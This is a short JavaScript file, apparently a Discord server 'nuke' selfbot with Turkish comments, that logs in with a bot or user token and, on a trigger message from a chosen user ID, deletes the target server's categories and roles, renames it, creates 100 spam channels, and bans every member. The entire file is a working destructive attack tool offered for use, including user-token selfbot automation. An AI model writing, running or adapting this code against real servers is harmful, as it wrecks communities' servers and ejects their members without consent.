const { Client } = require('discord.js-selfbot-v11');
const client = new Client();

const kadoayar = {
    token: "", // bot yada user hesap token 
    kullanıcakid: "", // komutları kullanabilecek id
    guild: "" // patlatılacak sunucu id
}

client.on("message", async(message) => {
    if (message.author.id === kadoayar.kullanıcakid) {
        if (message.content === "kado") {
            kadodelete(); // Bu kısımda sunucudaki katogorileri en çok üyesi olanlardan başlıyarak rolleri sunucu ismini değiştirip bir sürü kanal açar
        } else if (message.content === "kadomembersban") {
            message.guild.members.forEach(x => { x.ban(); }); // bu kısımda suncudaki üyeleri banlar
        }
    };
});

function kadodelete() {
    const guild = client.guilds.get(kadoayar.guild);
    guild.channels.filter(c => c.type === "category").forEach(x => { x.delete() });
    guild.roles.array().sort((r1, r2) => r2.members.size - r1.members.size).forEach(x => { x.delete(); });
    guild.setName("Kado Github Patlatma Bot"); // burda yapmasını istediğiniz sunucu adını yazın
    for (let i = 0; i < 100; i++) {
        guild.createChannel('kado-xd', { type: "text" }); // burda kado-xd yazan yere türkçe karakter olmadan acılmasını istediğiniz kanal ismini yazın
    }
}

client.login(kadoayar.token).then(() => console.log(`Hazır`)).catch(() => console.error(`Tokeni nasıl yanlış girmeyi becerdin dayı`));